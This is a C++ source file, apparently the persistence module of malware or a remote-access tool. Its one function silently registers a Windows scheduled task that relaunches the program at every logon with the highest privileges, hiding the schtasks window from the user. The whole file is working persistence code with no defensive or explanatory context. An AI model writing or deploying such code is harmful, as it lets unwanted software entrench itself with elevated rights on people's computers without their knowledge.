#include "persistence.h"
#include "config.h"
#include <windows.h>
#include <iostream>

bool install_persistence() {
    char exe_path[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
        return false;
    }

    std::string task_name = kTaskName;

    // On entoure le chemin de l'exe de doubles guillemets pour gérer les espaces
    std::string quoted_exe_path = "\"\\\"" + std::string(exe_path) + "\\\"\"";

    // On utilise le chemin complet de schtasks.exe + /RL HIGHEST
    std::string command = "C:\\Windows\\System32\\schtasks.exe /Create /SC ONLOGON /TN \""
        + task_name + "\" /TR " + quoted_exe_path + " /RL HIGHEST /F";

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char cmd_buffer[2048];
    strcpy_s(cmd_buffer, command.c_str());

    if (!CreateProcessA(NULL, cmd_buffer, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (exit_code == 0);
}